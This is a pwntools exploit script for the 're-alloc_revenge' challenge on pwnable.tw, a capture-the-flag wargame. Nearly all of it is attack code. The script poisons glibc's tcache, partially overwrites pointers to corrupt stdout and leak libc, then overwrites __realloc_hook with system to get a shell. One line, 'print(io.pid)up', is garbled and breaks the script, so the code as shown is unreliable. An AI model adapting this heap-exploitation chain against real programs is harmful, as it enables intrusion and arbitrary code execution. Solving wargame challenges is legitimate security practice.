#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./re-alloc_revenge')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10310)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
def choice(option):
    io.sendlineafter("Your choice: ", str(option))

def alloc(idx, size, data):
    # print("alloc", idx, size, data)
    choice(1)
    io.sendafter("Index:", str(idx))
    io.sendafter("Size:", str(size))
    io.sendafter("Data:", data)

def realloc(idx, size, data=p64(0xdeadbeef)):
    # print("realloc", idx, size, data)
    choice(2)
    io.sendafter("Index:", str(idx))
    io.sendafter("Size:", str(size))
    junk = io.recvn(5)
    if b"alloc" not in junk:
        io.send(data)

def free(idx):
    # print("free", idx)
    choice(3)
    io.sendafter("Index:", str(idx))

def rfree(idx):
    realloc(idx, 0)

libc = ELF(exe.libc.path)
while True:
    try:
        context.log_level = 'INFO'
        io = start()
        alloc(0, 0x70-8, (p64(0x0) + p64(0x51))*6)
        alloc(1, 0x70-8, (p64(0x0) + p64(0x21))*6)
        free(0)
        rfree(1)
        realloc(1, 0x50-8, '\x10\xa0') #partial overwrite fd to point to tcache per thread struct
        alloc(0, 0x70-8, (p64(0x0) + p64(0x21))*6)
        realloc(0, 0x80-8, (p64(0x0) + p64(0x21))*7)
        free(0)
        alloc(0, 0x70-8, 'p'*0x10 + '\x00'*0x58)
        rfree(0)
        realloc(0, 0x70-8, 'p'*0x10 + '\x00'*(0x70-8-0x10)) #make the chunks count 0x70 to fill the tcache
        #overwrote tcache struct
        log.info("overwrote tcache struct")
        realloc(0, 0x80-8, 'p'*0x10 + '\x00'*(0x80-8-0x10))
        free(0)
        alloc(0, 0x80-8, 'p'*0x10 + '\x00'*(0x80-8-0x10))
        realloc(0, 0x20-8, 'a')
        rfree(1)
        realloc(1, 0x20-8, 'a')
        free(1)
        free(0)
        alloc(0, 0x20-8, 'a'*8)
        realloc(0, 0x80-8, (p64(0x0) + p64(0x21))*7)
        realloc(0, 0x20-8, 'a'*8)
        free(0)
        free(1)
        alloc(1, 0x30-8, p64(0x0))
        rfree(1)
        alloc(0, 0x50-8, p64(0x0)*3 + p64(0xb1)) #create fake unsorted bin and overwrite the fd of tcache bin
        free(1)
        realloc(0, 0x50-8, p64(0x0)*3 + p64(0x41) + b'\x60\x17') #partial overwrite the fd to point to _IO_2_1_stdout
        free(0)
        alloc(0, 0x30-8, 'a')
        free(0)
        alloc(0, 0x30-8, p64(0xfbad1800) + p64(0x0)*3) #overwrite stdout to leak libc
        context.log_level = 'DEBUG'
        log.info("overwrote stdout")
        # print(io.recv())
        io.recvuntil("\xff\xff\xff\xff\xff\xff\xff\xff")
        io.recvn(8)
        libc.address = u64(io.recvn(6).ljust(8, b'\x00')) - 0x1e4780
        # libc.address = u64_bytes(6) - 0x1e4780
        log.info(f"libc base : {hex(libc.address)}")
        print(io.pid)up
        pause()
        alloc(1, 0x50-8, p64(0x0) *3 + p64(0x21) + p64(libc.sym.__realloc_hook - 8) + p64(0x0) + p64(0x0) + p64(0x81))
        free(1)
        alloc(1, 0x40-8, p64(libc.sym.__realloc_hook - 8))
        realloc(1, 0x80-8, p64(libc.sym.__realloc_hook - 8))
        free(1)
        alloc(1, 0x40-8, b'/bin/sh\x00' + p64(libc.sym.system))
        free(1)
        io.interactive()
    except:
        pass